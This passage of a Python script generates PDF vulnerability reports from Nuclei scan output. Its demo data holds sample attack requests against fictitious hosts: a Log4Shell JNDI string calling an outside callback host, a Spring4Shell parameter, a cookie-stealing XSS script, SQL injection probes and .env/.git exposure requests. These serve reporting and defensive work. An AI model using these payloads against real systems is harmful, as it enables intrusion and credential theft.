        hosts_info[f["host_key"]].append(f)

    _title  = report_title or "Nuclei Vulnerability Report"
    _author = author
    _finds  = findings
    _hosts  = dict(hosts_info)
    _date   = datetime.now().strftime("%d/%m/%Y %H:%M")

    # ── Callbacks de página ───────────────────────────────────────────────────

    def _page_cover(canvas, doc):
        canvas.saveState()
        draw_executive_cover(canvas, doc, _title, _hosts, _author, _finds)
        canvas.restoreState()

    def _page_inner(canvas, doc):
        canvas.saveState()

        # Fundo
        canvas.setFillColor(DARK_BG)
        canvas.rect(0, 0, PAGE_W, PAGE_H, stroke=0, fill=1)

        # Header
        canvas.setFillColor(BLACK)
        canvas.rect(0, PAGE_H - HEADER_H, PAGE_W, HEADER_H, stroke=0, fill=1)
        canvas.setFillColor(ACCENT)
        canvas.rect(0, PAGE_H - HEADER_H - 1, PAGE_W, 1, stroke=0, fill=1)
        canvas.setFont("Helvetica-Bold", 8.5)
        canvas.setFillColor(ACCENT)
        canvas.drawString(MARGIN, PAGE_H - 17, "NUCLEI")
        canvas.setFont("Helvetica", 8)
        canvas.setFillColor(TEXT_MUTED)
        canvas.drawString(MARGIN + 40, PAGE_H - 17, "Vulnerability Report")

        # Footer — apenas título do relatório + página
        canvas.setFillColor(BLACK)
        canvas.rect(0, 0, PAGE_W, FOOTER_H, stroke=0, fill=1)
        canvas.setFillColor(ACCENT)
        canvas.rect(0, FOOTER_H, PAGE_W, 0.5, stroke=0, fill=1)
        canvas.setFont("Helvetica", 6.5)
        canvas.setFillColor(TEXT_MUTED)
        canvas.drawCentredString(PAGE_W / 2, 6.5, _title[:70])

        page_num = getattr(doc, "page", "")
        canvas.drawRightString(PAGE_W - MARGIN, 6.5, str(page_num))

        canvas.restoreState()

    # ── Frames ────────────────────────────────────────────────────────────────
    frame_cover = Frame(0, 0, PAGE_W, PAGE_H,
                        leftPadding=0, rightPadding=0,
                        topPadding=0, bottomPadding=0,
                        id="cover")

    frame_inner = Frame(
        MARGIN, FOOTER_H + 2,
        PAGE_W - 2 * MARGIN,
        PAGE_H - HEADER_H - FOOTER_H - 4,
        leftPadding=0, rightPadding=0,
        topPadding=6, bottomPadding=6,
        id="inner"
    )

    tpl_cover = PageTemplate(id="Cover", frames=[frame_cover], onPage=_page_cover)
    tpl_inner = PageTemplate(id="Inner", frames=[frame_inner], onPage=_page_inner)

    doc = BaseDocTemplate(
        output_path,
        pagesize=A4,
        pageTemplates=[tpl_cover, tpl_inner],
        title=_title,
        author=_author,
    )

    # ── Story ─────────────────────────────────────────────────────────────────
    story = []

    # Página 1: capa
    story.append(NextPageTemplate("Inner"))
    story.append(PageBreak())

    # Sumário executivo
    build_executive_summary(story, styles, findings, _hosts, _title, author)

    # Índice
    build_index(story, styles, findings, _hosts)

    # Detalhamento — cada finding começa em nova página
    story.append(Paragraph("Detalhamento dos Findings", styles["h1"]))
    story.append(AccentBar())
    story.append(Spacer(1, 0.4 * cm))

    for i, f in enumerate(findings, 1):
        # PageBreak antes de cada finding (exceto o primeiro, que já tem espaço)
        if i > 1:
            story.append(PageBreak())
        build_finding(story, styles, f, i, len(findings))

    doc.multiBuild(story)
    return output_path


# ══════════════════════════════════════════════════════════════════════════════
#  Dados de demonstração (multi-host)
# ══════════════════════════════════════════════════════════════════════════════

DEMO_FINDINGS = [
    {
        "template-id": "CVE-2021-44228",
        "info": {
            "name": "Apache Log4j RCE (Log4Shell)",
            "severity": "critical",
            "description": (
                "Apache Log4j2 <=2.14.1 JNDI features used in configuration, "
                "log messages, or parameters do not protect against attacker "
                "controlled LDAP and other JNDI related endpoints. "
                "An attacker who can control log messages or log message parameters "
                "can execute arbitrary code loaded from LDAP servers."
            ),
            "remediation": (
                "Atualize o Apache Log4j para a versão 2.17.1 ou superior. "
                "Como mitigação imediata, defina a propriedade do sistema "
                "log4j2.formatMsgNoLookups=true ou remova a classe JndiLookup "
                "do classpath. Bloqueie chamadas LDAP de saída no firewall."
            ),
            "reference": [
                "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
                "https://logging.apache.org/log4j/2.x/security.html",
            ],
            "classification": {
                "cve-id": ["CVE-2021-44228"],
                "cwe-id": ["CWE-502"],
                "cvss-score": 10.0,
            },
            "tags": ["cve", "log4j", "rce", "java", "critical"],
        },
        "matched-at": "https://app.empresa.com.br:8080/api/login",
        "host":        "https://app.empresa.com.br:8080",
        "ip":          "200.1.2.50",
        "type":        "http",
        "matcher-name": "dns",
        "timestamp":   "2024-06-15T14:22:01.000Z",
        "request":  "POST /api/login HTTP/1.1\r\nHost: app.empresa.com.br:8080\r\nContent-Type: application/json\r\nUser-Agent: ${jndi:ldap://attacker.oast.fun/log4j}\r\n\r\n{\"username\":\"${jndi:ldap://oast.fun/x}\",\"password\":\"test\"}",
        "response": "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nX-Powered-By: Spring Boot 2.6.1\r\n\r\n{\"status\":\"error\",\"code\":401}",
        "extracted-results": ["DNS callback received from 200.1.2.50"],
    },
    {
        "template-id": "CVE-2022-22965",
        "info": {
            "name": "Spring4Shell — Spring Framework RCE",
            "severity": "critical",
            "description": (
                "Vulnerabilidade de RCE no Spring Framework (5.3.x < 5.3.18) "
                "quando usado com JDK 9+ via DataBinder. O atacante pode gravar "
                "arquivos JSP maliciosos no servidor."
            ),
            "remediation": "Atualize Spring Framework para 5.3.18+ ou 5.2.20+.",
            "reference": ["https://nvd.nist.gov/vuln/detail/CVE-2022-22965"],
            "classification": {"cve-id": ["CVE-2022-22965"], "cvss-score": 9.8},
            "tags": ["cve", "spring", "rce", "java"],
        },
        "matched-at": "https://app.empresa.com.br:8080/spring/upload",
        "host":        "https://app.empresa.com.br:8080",
        "ip":          "200.1.2.50",
        "type":        "http",
        "timestamp":   "2024-06-15T14:23:10.000Z",
        "request":  "GET /spring/upload?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di HTTP/1.1\r\nHost: app.empresa.com.br:8080\r\n\r\n",
        "response": "HTTP/1.1 400 Bad Request\r\nContent-Type: text/html\r\n\r\n<html><body>Whitelabel Error Page</body></html>",
    },
    # ── Segundo host ──────────────────────────────────────────────────────────
    {
        "template-id": "sqli-error-based",
        "info": {
            "name": "SQL Injection — Error Based",
            "severity": "high",
            "description": (
                "Parâmetro de busca vulnerável a SQL injection baseada em erro. "
                "Mensagens de erro do MySQL são refletidas na resposta, permitindo "
                "extração de dados via error-based technique."
            ),
            "remediation": (
                "Use prepared statements em todas as queries. "
                "Nunca concatene input do usuário em strings SQL. "
                "Implemente validação de input server-side e configure WAF."
            ),
            "reference": [
                "https://owasp.org/www-community/attacks/SQL_Injection",
                "https://portswigger.net/web-security/sql-injection",
            ],
            "classification": {"cwe-id": ["CWE-89"], "cvss-score": 8.8},
            "tags": ["sqli", "injection", "owasp-top10"],
        },
        "matched-at": "https://loja.empresa.com.br/busca?q=produto",
        "host":        "https://loja.empresa.com.br",
        "ip":          "200.1.2.51",
        "type":        "http",
        "matcher-name": "word",
        "timestamp":   "2024-06-15T14:25:00.000Z",
        "request":  "GET /busca?q=produto' HTTP/1.1\r\nHost: loja.empresa.com.br\r\nCookie: PHPSESSID=abc123\r\n\r\n",
        "response": "HTTP/1.1 500 Internal Server Error\r\nContent-Type: text/html\r\n\r\nYou have an error in your SQL syntax near ''produto'''",
        "extracted-results": ["MySQL 8.0.28-commercial", "error-based injection confirmed"],
    },
    {
        "template-id": "xss-reflected",
        "info": {
            "name": "Cross-Site Scripting (XSS) Refletido",
            "severity": "medium",
            "description": (
                "O parâmetro 'q' reflete input não sanitizado diretamente no HTML, "
                "permitindo execução de scripts maliciosos no navegador da vítima."
            ),
            "remediation": (
                "Encode todo output HTML. Implemente Content Security Policy (CSP). "
                "Use DOMPurify para sanitização client-side. "
                "Defina HttpOnly nos cookies de sessão."
            ),
            "reference": [
                "https://owasp.org/www-community/attacks/xss/",
                "https://portswigger.net/web-security/cross-site-scripting",
            ],
            "classification": {"cwe-id": ["CWE-79"], "cvss-score": 6.1},
            "tags": ["xss", "owasp-top10", "client-side"],
        },
        "matched-at": "https://loja.empresa.com.br/busca?q=<script>alert(1)</script>",
        "host":        "https://loja.empresa.com.br",
        "ip":          "200.1.2.51",
        "type":        "http",
        "timestamp":   "2024-06-15T14:26:30.000Z",
        "request":  "GET /busca?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E HTTP/1.1\r\nHost: loja.empresa.com.br\r\n\r\n",
        "response": "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html><body><h2>Resultados: <script>alert(document.cookie)</script></h2></body></html>",
        "extracted-results": ["<script>alert(document.cookie)</script> reflected in body"],
    },
    # ── Terceiro host ─────────────────────────────────────────────────────────
    {
        "template-id": "exposed-git-repo",
        "info": {
            "name": "Git Repository Exposto Publicamente",
            "severity": "low",
            "description": (
                "O diretório .git está acessível via HTTP. "
                "Atacantes podem reconstruir o código-fonte, "
                "expondo credenciais hardcoded e histórico de commits."
            ),
            "remediation": (
                "Bloqueie o acesso ao .git via servidor web. "
                "Nginx: deny all para location ~ /\\.git. "
                "Apache: Require all denied no .htaccess."
            ),
            "reference": ["https://owasp.org/www-project-web-security-testing-guide/"],
            "tags": ["git", "exposure", "misconfiguration"],
        },
        "matched-at": "https://api.empresa.com.br/.git/HEAD",
        "host":        "https://api.empresa.com.br",
        "ip":          "200.1.2.52",
        "type":        "http",
        "timestamp":   "2024-06-15T14:27:00.000Z",
        "request":  "GET /.git/HEAD HTTP/1.1\r\nHost: api.empresa.com.br\r\n\r\n",
        "response": "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nref: refs/heads/main",
        "extracted-results": ["ref: refs/heads/main"],
    },
    {
        "template-id": "tech-detect-nginx",
        "info": {
            "name": "Nginx — Versão Divulgada no Header",
            "severity": "info",
            "description": "O servidor revela a versão exata do Nginx no header 'Server', facilitando fingerprinting.",
            "remediation": "Adicione 'server_tokens off;' no nginx.conf e recarregue o serviço.",
            "reference": ["https://nginx.org/en/docs/http/ngx_http_core_module.html#server_tokens"],
            "tags": ["tech", "nginx", "disclosure"],
        },
        "matched-at": "https://api.empresa.com.br/",
        "host":        "https://api.empresa.com.br",
        "ip":          "200.1.2.52",
        "type":        "http",
        "timestamp":   "2024-06-15T14:20:00.000Z",
        "request":  "GET / HTTP/1.1\r\nHost: api.empresa.com.br\r\n\r\n",
        "response": "HTTP/1.1 200 OK\r\nServer: nginx/1.18.0 (Ubuntu)\r\nContent-Type: text/html\r\n\r\n<html><body>API v2</body></html>",
        "extracted-results": ["nginx/1.18.0"],
    },
    {
        "template-id": "exposed-env-file",
        "info": {
            "name": "Arquivo .env Exposto",
            "severity": "high",
            "description": (
                "O arquivo .env está acessível publicamente e contém variáveis de ambiente "
                "sensíveis como credenciais de banco de dados, chaves de API e tokens secretos."
            ),
            "remediation": (
                "Remova o arquivo .env do webroot imediatamente. "
                "Bloqueie o acesso via servidor web. "
                "Rotacione todas as credenciais e chaves expostas."
            ),
            "reference": [
                "https://owasp.org/www-project-web-security-testing-guide/",
            ],
            "classification": {"cwe-id": ["CWE-200"], "cvss-score": 7.5},
            "tags": ["exposure", "env", "credentials", "misconfiguration"],
        },
        "matched-at": "https://api.empresa.com.br/.env",
        "host":        "https://api.empresa.com.br",
        "ip":          "200.1.2.52",
        "type":        "http",
        "timestamp":   "2024-06-15T14:28:00.000Z",
        "request":  "GET /.env HTTP/1.1\r\nHost: api.empresa.com.br\r\n\r\n",
        "response": "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nDB_HOST=localhost\r\nDB_USER=root\r\nDB_PASS=P@ssw0rd123!\r\nAPP_KEY=base64:abc123...\r\nMAIL_PASSWORD=smtp_secret",
        "extracted-results": ["DB credentials exposed", "APP_KEY exposed"],
    },
]


# ══════════════════════════════════════════════════════════════════════════════
#  CLI
# ══════════════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="Gera relatório PDF profissional a partir de resultados do Nuclei.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemplos:
  # Scan real (múltiplos hosts)
  nuclei -l targets.txt -json -o results.jsonl
  python nuclei_report.py -i results.jsonl -o report.pdf --author "Red Team" --title "Pentest Q2"

  # Demo (3 hosts fictícios)
  python nuclei_report.py --demo
  python nuclei_report.py --demo --author "João Silva" --title "Avaliação de Segurança"
        """
    )
    parser.add_argument("-i", "--input",  help="Arquivo de resultados Nuclei (JSONL ou JSON array)")
    parser.add_argument("-o", "--output", help="PDF de saída", default="nuclei_report.pdf")
    parser.add_argument("--title",  help="Título do relatório", default="")
    parser.add_argument("--author", help="Nome do analista / autor", default="")
    parser.add_argument("--demo",   action="store_true",
                        help="Gera relatório demo com 3 hosts e 7 findings fictícios")
    args = parser.parse_args()

    if args.demo:
        out = args.output if args.output != "nuclei_report.pdf" else "nuclei_report_demo.pdf"
        print(f"[*] Gerando relatório demo → {out}")
        generate_report(
            DEMO_FINDINGS, out,
            report_title=args.title  or "Relatório de Avaliação de Segurança",
            author=args.author       or "Red Team — Security Assessment",
        )
        print(f"[+] Relatório gerado: {out}")
        return

    if not args.input:
        parser.error("Informe --input ou use --demo")
    if not os.path.exists(args.input):
        print(f"[!] Arquivo não encontrado: {args.input}", file=sys.stderr)
        sys.exit(1)

    print(f"[*] Lendo: {args.input}")
    raw = parse_nuclei_jsonl(args.input)
    print(f"[*] Findings carregados: {len(raw)}")

    # Mostra hosts detectados
    hosts_detected = set()
    for r in raw:
        h = r.get("host", "") or r.get("matched-at", "")
        hosts_detected.add(normalize_host(h))
    print(f"[*] Hosts detectados: {len(hosts_detected)}")
    for h in sorted(hosts_detected):
        print(f"    • {h}")

    generate_report(raw, args.output,
                    report_title=args.title,
                    author=args.author)
    print(f"[+] Relatório gerado: {args.output}")


if __name__ == "__main__":
    main()
